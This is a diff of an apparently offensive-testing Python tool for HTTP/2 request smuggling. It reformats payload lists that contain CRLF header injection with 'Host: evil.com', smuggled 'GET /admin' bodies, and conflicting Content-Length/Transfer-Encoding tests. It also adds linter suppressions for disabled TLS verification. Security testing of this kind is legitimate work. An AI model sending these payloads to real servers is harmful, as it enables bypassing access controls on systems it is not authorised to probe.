@@ -9,7 +9,9 @@ H2_PATHS = ["/", "/api/", "/admin/", "/login", "/api/v1/", "/graphql"]
 
 # ──────────── H2 HEADER ATTACKS ────────────
 H2_HEADER_ATTACKS = {
-    "PSEUDO_HEADER_INJECTION": {":method": "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin"},
+    "PSEUDO_HEADER_INJECTION": {
+        ":method": "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin"
+    },
     "HEADER_NAME_CRLF": {"X-Test\r\nHost: evil.com": "inject"},
     "TRANSFER_ENCODING_H2": {"transfer-encoding": "chunked"},
     "CONNECTION_HEADER_H2": {"connection": "keep-alive"},
@@ -24,15 +26,31 @@ H2_HEADER_ATTACKS = {
 
 # ──────────── H2.CL DESYNC ────────────
 H2CL_TESTS = [
-    {"method": "POST", "headers": {"Content-Length": "0", "Transfer-Encoding": "chunked"}, "body": ""},
+    {
+        "method": "POST",
+        "headers": {"Content-Length": "0", "Transfer-Encoding": "chunked"},
+        "body": "",
+    },
     {"method": "POST", "headers": {"Content-Length": "5"}, "body": "0\r\n\r\n"},
-    {"method": "POST", "headers": {"Content-Length": "0"}, "body": "GET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n"},
+    {
+        "method": "POST",
+        "headers": {"Content-Length": "0"},
+        "body": "GET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n",
+    },
 ]
 
 # ──────────── H2.TE DESYNC ────────────
 H2TE_TESTS = [
-    {"method": "POST", "headers": {"Transfer-Encoding": "chunked"}, "body": "0\r\n\r\nSMUGGLED"},
-    {"method": "POST", "headers": {"Transfer-Encoding": "chunked, identity"}, "body": "0\r\n\r\n"},
+    {
+        "method": "POST",
+        "headers": {"Transfer-Encoding": "chunked"},
+        "body": "0\r\n\r\nSMUGGLED",
+    },
+    {
+        "method": "POST",
+        "headers": {"Transfer-Encoding": "chunked, identity"},
+        "body": "0\r\n\r\n",
+    },
 ]
 
 
@@ -76,7 +94,7 @@ def _test_h2_desync(target, path, tests, test_type):
                     headers=test["headers"],
                     data=test.get("body", ""),
                     timeout=8,
-                    verify=False,
+                    verify=False,  # nosec B501
                 )
                 if resp.status_code == 400:
                     vulns.append(
@@ -148,7 +166,7 @@ def _test_websocket_h2(target):
                 "Sec-WebSocket-Version": "13",
             },
             timeout=5,
-            verify=False,
+            verify=False,  # nosec B501
         )
         if resp.status_code == 200:
             return {
